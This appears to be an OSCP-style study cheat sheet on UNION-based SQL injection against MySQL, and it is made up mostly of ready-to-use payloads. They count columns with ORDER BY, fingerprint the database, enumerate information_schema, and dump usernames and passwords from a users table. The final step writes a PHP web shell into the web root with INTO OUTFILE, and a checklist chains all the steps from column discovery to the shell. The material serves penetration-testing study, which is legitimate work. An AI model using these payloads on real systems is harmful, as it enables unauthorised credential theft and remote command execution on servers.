# SQLi — UNION-Based

Use for **in-band SQLi** when the application renders query results and an injected `UNION SELECT` can append a second result set.

## Requirements

1. The injected `UNION SELECT` must return the **same number of columns** as the original query.
2. Corresponding column data types must be compatible.

## 1. Discover the column count

Increase the `ORDER BY` index until the application errors:

```sql
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
' ORDER BY 4-- //
' ORDER BY 5-- //
' ORDER BY 6-- //   # if this errors, there are 5 columns
```

Do not infer the count only from what the page visually displays; columns may be hidden.

## 2. Find usable output columns + fingerprint

Use `NULL` placeholders for unused columns:

```sql
' UNION SELECT null,null,database(),user(),@@version -- //
```

If a value does not appear or a type mismatch occurs, move the value to another returned column. ID columns are often numeric and may not accept/display strings.

## 3. Enumerate tables and columns

MySQL `information_schema.columns` can reveal the current database structure:

```sql
' UNION SELECT null,table_name,column_name,table_schema,null
FROM information_schema.columns
WHERE table_schema=database() -- //
```

Look for tables/columns such as `users`, `username`, `password`, and other credential-bearing data.

## 4. Dump interesting rows

Example from the chapter:

```sql
' UNION SELECT null,username,password,description,null FROM users -- //
```

## 5. File write / web shell when permitted

If the database OS identity can write into a web-accessible directory:

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

The SQL query itself may report a return-type error while the file is still written; verify by requesting the expected web-shell path.

## OSCP checklist

```text
ORDER BY → column count
    ↓
UNION SELECT + NULLs
    ↓
Find visible/string-compatible columns
    ↓
database() / user() / @@version
    ↓
information_schema.columns
    ↓
Dump users / hashes / secrets
    ↓
Check file-write path → INTO OUTFILE → web shell
```
